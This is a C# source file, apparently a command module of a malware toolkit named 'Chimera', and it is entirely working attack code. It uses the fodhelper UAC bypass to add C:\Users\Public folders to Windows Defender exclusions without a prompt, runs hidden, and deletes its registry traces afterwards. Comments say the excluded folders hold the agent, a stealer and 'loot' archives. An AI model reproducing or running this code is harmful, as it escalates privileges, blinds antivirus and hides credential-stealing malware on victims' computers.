using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // Adds C:\Users\Public to Windows Defender exclusions via fodhelper UAC bypass.
    // No UAC prompt — fodhelper.exe is auto-elevated by Windows.
    // Works on Windows 10/11 without admin rights.
    public static class DefenderExclusion
    {
        // Paths we want excluded — agent.dat, stealer, loot zips all live here
        private static readonly string[] ExcludePaths = new[]
        {
            @"C:\Users\Public",
            @"C:\Users\Public\Chrome",
        };

        public static string Execute()
        {
            var sb = new System.Text.StringBuilder();
            foreach (string path in ExcludePaths)
            {
                string result = AddExclusion(path);
                sb.AppendLine(result);
            }
            return sb.ToString().Trim();
        }

        private static string AddExclusion(string path)
        {
            try
            {
                // The reg command that will run elevated via fodhelper
                string hklm = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
                string cmd  = "reg add \"" + hklm + "\" /v \"" + path + "\" /t REG_DWORD /d 0 /f";

                // Fodhelper UAC bypass:
                // Write cmd into ms-settings shell open command, set DelegateExecute to trigger elevation,
                // launch fodhelper.exe (auto-elevates), it reads and runs our cmd elevated.
                const string regPath  = @"Software\Classes\ms-settings\shell\open\command";
                const string cleanKey = @"Software\Classes\ms-settings";

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                {
                    if (key == null) return "[-] Could not create registry key for " + path;
                    key.SetValue("",               cmd);    // default value = our command
                    key.SetValue("DelegateExecute", "");    // triggers auto-elevation
                }

                // Launch fodhelper — it reads the registry key and runs cmd elevated
                Process.Start(new ProcessStartInfo("fodhelper.exe")
                {
                    WindowStyle    = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                // Give it time to execute then clean up the registry traces
                Thread.Sleep(2500);

                try { Registry.CurrentUser.DeleteSubKeyTree(cleanKey, false); } catch { }

                return "[+] Defender exclusion added: " + path;
            }
            catch (Exception ex)
            {
                return "[-] Exclusion failed for " + path + ": " + ex.Message;
            }
        }
    }
}
